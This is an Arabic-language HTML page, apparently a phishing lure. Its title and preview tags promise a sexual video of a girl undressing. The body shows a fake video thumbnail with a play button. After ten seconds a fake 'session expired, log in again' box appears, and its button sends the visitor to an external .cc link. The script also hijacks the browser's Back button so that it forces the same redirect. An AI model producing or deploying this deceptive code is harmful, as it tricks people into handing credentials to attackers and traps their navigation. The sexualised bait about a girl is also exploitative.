<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>فتاة من منتقطة السبيخة تنزع ثيتبها و تصور جسدها</title>

  <!-- OG tags -->
  <meta property="og:title" content="فتاة من منتقطة السبيخة تنزع ثيتبها و تصور ">
  <meta property="og:description" content="فتاة من منتقطة السبيخة تنزع ثيتبها و تصور .">
  <meta property="og:image" content="https://files.fm/thumb_show.php?i=32jacd2cxj">
  <meta property="og:url" content="https://yourwebsite.com/your-page.html">
  <meta property="og:type" content="website">
  <meta name="theme-color" content="#007bff">

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body, html {
      height: 100%;
      overflow: hidden;
      font-family: 'Tajawal', sans-serif;
      background: #000;
    }
    .video-wrapper {
      position: relative;
      width: 100%;
      height: 100vh;
      overflow: hidden;
    }
    .video-wrapper img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    .play-button {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 80px;
      height: 80px;
      background: rgba(0,0,0,0.5);
      border-radius: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
      cursor: pointer;
      z-index: 2;
    }
    .play-button::before {
      content: "";
      display: block;
      border-style: solid;
      border-width: 15px 0 15px 25px;
      border-color: transparent transparent transparent white;
    }
    .overlay {
      position: fixed;
      top: 0;
      right: 0;
      bottom: 0;
      left: 0;
      background: rgba(255, 255, 255, 0.95);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 10;
      display: none;
      animation: fadeIn 0.5s ease-in-out;
    }
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    .message-box {
      background: #fff;
      padding: 20px 25px;
      border-radius: 12px;
      text-align: center;
      width: 90%;
      max-width: 320px;
      box-shadow: 0 5px 20px rgba(0,0,0,0.2);
    }
    .message-box h2 {
      margin-bottom: 20px;
      color: #333;
      font-size: 18px;
      line-height: 1.5;
    }
    .message-box button {
      width: 100%;
      background: #007bff;
      color: #fff;
      border: none;
      padding: 12px 0;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.3s;
    }
    .message-box button:hover {
      background: #0056b3;
    }
  </style>
</head>

<body>

<!-- الصورة مع زر التشغيل -->
<div class="video-wrapper" id="fakeVideo">
  <img src="https://files.fm/thumb_show.php?i=32jacd2cxj" alt="Fake Video">
  <div class="play-button" onclick="startFakeVideo()"></div>
</div>

<!-- الرسالة البيضاء -->
<div class="overlay" id="sessionOverlay">
  <div class="message-box">
    <h2>انتهت صلاحية الجلسة<br> الرجاء إعادة تسجيل الدخول</h2>
    <button onclick="redirectUser()">موافق</button>
  </div>
</div>

<script>
const redirectLink = "https://woershiduoqipa.cc/f0b?id=77a5ba32-4ac0-43d8-6e09-08dd36290a41"; // <-- ضع هنا رابط موقعك

function startFakeVideo() {
  // إخفاء زر التشغيل
  document.querySelector('.play-button').style.display = 'none';

  // بدء العداد لظهور الرسالة
  setTimeout(() => {
    document.getElementById('sessionOverlay').style.display = 'flex';
  }, 10000); // 10 ثواني بدلاً من 15
}

// وظيفة زر "موافق"
function redirectUser() {
  window.location.href = redirectLink;
}

// منع الرجوع بزر Back وتحويله مباشرة
history.pushState(null, null, location.href);
window.onpopstate = function () {
  window.location.href = redirectLink;
};
</script>

</body>
</html>
